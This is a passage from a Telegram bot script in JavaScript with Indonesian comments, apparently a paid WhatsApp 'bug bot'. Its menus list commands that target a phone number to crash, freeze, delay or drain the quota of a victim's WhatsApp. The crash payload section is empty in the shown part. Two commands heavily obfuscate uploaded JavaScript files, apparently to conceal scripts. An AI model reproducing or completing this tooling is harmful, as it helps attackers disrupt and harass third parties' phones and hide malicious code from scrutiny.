    );
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengupload file ke Catbox");
  }
});


// ---- command /enc (to encrypt js files)
bot.command("enchard", checkPremium, async (ctx) => {
    console.log(`Perintah diterima: /enc dari pengguna: ${ctx.from.username || ctx.from.id}`);
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('❌ Silakan balas file .js untuk dienkripsi.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    try {
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: "text" });
        let codeString = response.data;

        if (typeof codeString !== "string") {
            throw new Error("File bukan dalam format string yang valid.");
        }

        ctx.reply("Sabar.. Lagi di Encrypt sama Kultus");

        let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            compact: true,
            controlFlowFlattening: 0.8,
            deadCode: 0.3,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.7,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.5,
            stringConcealing: true,
            stringCompression: true,
            opaquePredicates: 0.9,
            calculator: true,
            hexadecimalNumbers: true,
            shuffle: true,
            identifierGenerator: () => "高宝座ZEROXSUKALOBANG齐Xz高宝座" + Math.random().toString(36).substring(7),
        });

        if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
            obfuscatedCode = obfuscatedCode.code;
        }

        if (typeof obfuscatedCode !== 'string') {
            throw new Error("Hasil enkripsi bukan dalam format string.");
        }

        console.log(typeof obfuscatedCode, obfuscatedCode);

        const encryptedFilePath = `./KultusEncrypted_${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode, "utf-8");

        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `encrypted_${fileName}` },
            { caption: `✅ Encryption Successful\n• Type: Hades Hard\n• By @zeroxploitt7` }
        );

        fs.unlinkSync(encryptedFilePath);
    } catch (err) {
        console.error("Error during encryption:", err);
        await ctx.reply(`❌ An error occurred: ${err.message}`);
    }
});

// ---- command /enc (to encrypt js files)
bot.command("encninecore", checkPremium, async (ctx) => {
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document) {
        return ctx.reply("❌ Silakan balas file .js untuk dienkripsi.");
    }

    const fileName = replyMessage.document.file_name;
    if (!fileName.endsWith(".js")) {
        return ctx.reply("❌ Hanya file .js yang dapat dienkripsi.");
    }

    try {
        const fileId = replyMessage.document.file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: "text" });
        let codeString = response.data;

        if (typeof codeString !== "string") {
            throw new Error("File bukan dalam format string yang valid.");
        }

        ctx.reply("⚡️ Lagi Diproses sama Kultus... Sbar lek");

        let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            controlFlowFlattening: 0.9,
            deadCode: 0.2,
            dispatcher: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.4,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 0.8,
            shuffle: true,
            opaquePredicates: 0.85,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true,
            identifierGenerator: () => "高宝座AMPASKULTUS齐Xz高宝座" + Math.random().toString(36).substring(7),
        });

        if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
            obfuscatedCode = obfuscatedCode.code;
        }

        if (typeof obfuscatedCode !== 'string') {
            throw new Error("Hasil enkripsi bukan dalam format string.");
        }

        console.log(typeof obfuscatedCode, obfuscatedCode);

        const encryptedFilePath = `./KultusEncrypted_${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode, "utf-8");

        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `encrypted_${fileName}` },
            { caption: `✅ Successful Encrypt\n• Type: Hades Nine Core\n• By @zeroxploitt7` }
        );

        fs.unlinkSync(encryptedFilePath);
    } catch (err) {
        console.error("Error during encryption:", err);
        await ctx.reply(`❌ An error occurred: ${err.message}`);
    }
});

//START SESI
startSesi();

bot.start(async (ctx) => {
  // Mengirim status "mengetik"
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = 
`<blockquote><pre>╔══✠『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』✠══╗
║ ⚝ ɴᴀᴍᴇ     : Exorcist Community
║ ⚝ ᴅᴇᴠ      : @Putxzyy
║ ⚝ ᴠᴇʀꜱɪᴏɴ  : 2.0
║ ⚝ ʟɪʙʀᴀʀʏ  : JavaScript
╚═════════════════════╝
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "Ошибки меню",
      callback_data: "bugmenux"
    }],
      [{
      text: "Меню настроек",
      callback_data: "settingcmd"
    }],
      [{
      text: "Меню владельца",
      callback_data: "ownermenu"
    }],
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

//HANDLER UNTUK BUGMENU
bot.action('bugmenux', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage = 
`<blockquote><pre>┏━━༺ 𖤐 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𖤐 ༻━┓
┃ ✠ Nᴀᴍᴇ      : Exorcist Community
┃ ✠ Dᴇᴠᴇʟᴏᴘᴇʀ : @Putxzyy
┃ ✠ Vᴇʀsɪᴏɴ   : 2.0
┃ ✠ Lɪʙʀᴀʀʏ   : ᴊᴀᴠᴀsᴄʀɪᴘᴛ 
┗━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━༺ 🜏 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 🜏 ༻━━┓
┃ ▷ /easydelay 62xx ⟶ ᴇᴀsʏ ᴅᴇʟᴀʏ
┃ ▷ /freeze 62xx ⟶ 𝙵𝚁𝙴𝙴𝚉𝙴 𝙷𝙾𝙼𝙴
┃ ▷ /drain 62xx ⟶ ᴅᴇʟᴀʏ × ǫᴜᴏᴛᴀ ᴅʀᴀɪɴ
┃ ▷ /xcrash 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴
┗━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━༺ ✦ 𝐇𝐀𝐑𝐃-𝐂𝐎𝐑𝐄 ✦ ༻━━┓
┃ ▷ /combo 62xx ⟶ 𝙲𝙾𝙼𝙱𝙾 𝙰𝙻𝙻 𝙱𝚄𝙶
┃ ▷ /hardelay 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟷
┃ ▷ /rimuru 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟸
┃ ▷ /vasion 62xx ⟶ 𝙳𝙴𝙻𝙰𝚈 × 𝙵𝚁𝙴𝙴𝚉𝙴
┗━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━༺ ⚠ 𝐍𝐎𝐓𝐄𝐒 ⚠ ༻━━┓
┃ ⚠  sᴇɴᴅᴇʀ ᴡᴀᴊɪʙ ᴡᴀ ᴏʀɪ (ɴᴏ ʙɪsɴɪs)
┃ ⚠  ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴜɢ ʏ
┃ ⚠  ᴅɪᴊᴇᴅᴀ 𝟻/𝟷𝟶 ᴍɴᴛ ᴘᴇʀ ʙᴜɢ ɴʏᴀ.
┗━━━━━━━━━━━━━━━━━━━━━━━┛
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "🇷🇺",
    url: "https://t.me/Putxzyy"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

// Handler untuk callback "owner_management"
bot.action('settingcmd', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage = 
`<blockquote><pre>┌─〔 EXORCIST COMMUNITY 〕─┐
│ Name      : Exorcist Community
│ Developer : @Putxzyy
│ Version   : 2.0 (Latest)
│ Library   : JavaScript
└──────────────────────┘

┌─〔 SETTINGS MENU 〕─┐
│ /cekusersc → Cek pengguna script
│ /monitoruser → Cek pengguna bot
│ /enchard → Encrypt .js (reply)
│ /encninecore → NineCore Enc.js (reply)
└──────────────────┘
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "🇷🇺",
    url: "https://t.me/Putxzyy"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

bot.action('ownermenu', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage =
`<blockquote><pre>┌─〔 EXORCIST COMMUNITY 〕─┐
│ Name      : Exorcist Community
│ Developer : @Putxzyy
│ Version   : 2.0 (Latest)
│ Library   : JavaScript
└──────────────────────┘

┌─〔 OWNER MENU 〕─┐
│ /addprem [id] [30d]
│ /delprem [id]
│ /addadmin [id]      
│ /deladmin [id]
│ /xconnect [no wa]
└───────────────┘
</pre></blockquote>
`;
  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "🇷🇺",
    url: "https://t.me/Putxzyy"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
 const mainMenuMessage =
 `<blockquote><pre>╔══✠『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』✠══╗
║ ⚝ ɴᴀᴍᴇ     : Exorcist Community
║ ⚝ ᴅᴇᴠ      : @Putxzyy
║ ⚝ ᴠᴇʀꜱɪᴏɴ  : 2.0
║ ⚝ ʟɪʙʀᴀʀʏ  : JavaScript
╚═════════════════════╝
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "Ошибки меню",
      callback_data: "bugmenux"
    }],
      [{
      text: "Меню настроек𝘂",
      callback_data: "settingcmd"
    }],
      [{
      text: "Меню владельца",
      callback_data: "ownermenu"
    }],
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

//func bug disini//////













// --- Jalankan Bot ---
bot.launch();
